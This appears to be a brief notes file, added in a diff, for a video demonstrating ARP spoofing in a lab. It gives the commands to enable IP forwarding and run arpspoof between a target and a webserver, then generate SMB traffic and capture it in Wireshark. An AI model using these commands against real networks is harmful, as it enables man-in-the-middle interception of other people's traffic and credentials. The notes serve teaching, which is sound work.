@@ -1,0 +1,14 @@
+#ARP Spoofing Video Notes - RCM 8/17/2021
+
+#Before starting the ARP spoof:
+
+`echo 1 > /proc/sys/net/ipv4/ip_forward`
+
+#ARPspoof
+
+`arpspoof -i eth0 -t <target IP> -r <IP of the webserver>
+
+#In Windows machine to generate some traffic
+\\fileserver\data
+
+#Monitoring in Wireshark.
